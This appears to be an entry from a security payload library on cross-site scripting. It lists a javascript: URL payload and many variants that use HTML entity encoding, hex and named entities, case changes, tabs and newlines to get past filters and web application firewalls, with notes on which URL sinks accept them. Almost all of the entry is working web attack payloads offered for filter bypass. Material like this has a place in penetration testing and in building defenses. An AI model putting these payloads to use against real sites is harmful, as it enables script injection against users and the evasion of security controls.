---
title: javascript: Protocol Bypass via Encoding and Whitespace
slug: javascript-protocol-bypass
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/href, sink/javascript-uri, sink/waf-bypass]
inbound: []
---

# javascript: Protocol Bypass via Encoding and Whitespace

## Payload

```html
<a href="&#106;avascript:alert(1)">XSS</a>
```

## Variants

```html
<!-- Decimal entity no semicolon -->
<a href="&#106avascript:alert(1)">XSS</a>

<!-- Decimal entities with zero padding -->
<a href="&#0000106avascript:alert(1)">XSS</a>

<!-- Hex entities -->
<a href="&#x6a;avascript:alert(1)">XSS</a>
<a href="j&#x61vascript:alert(1)">XSS</a>
<a href="&#x0000006a;avascript:alert(1)">XSS</a>
<a href="&#X6A;avascript:alert(1)">XSS</a>

<!-- Named HTML entities in protocol -->
<a href="javascript&colon;alert(1)">XSS</a>
<a href="java&Tab;script:alert(1)">XSS</a>
<a href="java&NewLine;script:alert(1)">XSS</a>
<a href="javascript&colon;alert&lpar;1&rpar;">XSS</a>

<!-- Case insensitive -->
<a href="JaVaScript:alert(1)">XSS</a>

<!-- Whitespace chars before protocol -->
<a href=" 	javascript:alert(1)">XSS</a>

<!-- Tab/LF inside protocol name -->
<a href="javas	cript:alert(1)">XSS</a>
<a href="javascript
:alert(1)">XSS</a>

<!-- URL encoding of payload -->
<a href="javascript:x='%27-alert(1)-%27';">XSS</a>

<!-- Navigation via JS -->
<script>navigation.navigate('javascript:alert(1)')</script>
```

## Context

Applies to sinks like `href`, `src`, `action`, `formaction`, `location.href`, or any attribute/property that interprets URLs. The browser parses `javascript:` protocol with generous entity decoding before the security check, so HTML entity, numeric, hex, named-entity, and case variants all resolve to the same protocol. Tab (`\t`), linefeed (`\n`), and other whitespace characters within the protocol name are stripped by browsers during URL parsing. Requires a click (or JS redirect via `navigation.navigate`) to execute. Named entity `&colon;` requires HTML context to decode.

## Provenance

- Distilled from: `../../techniques/dom-xss/waf-bypass.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [WAF Bypass and Obfuscation](../../techniques/dom-xss/waf-bypass.md)
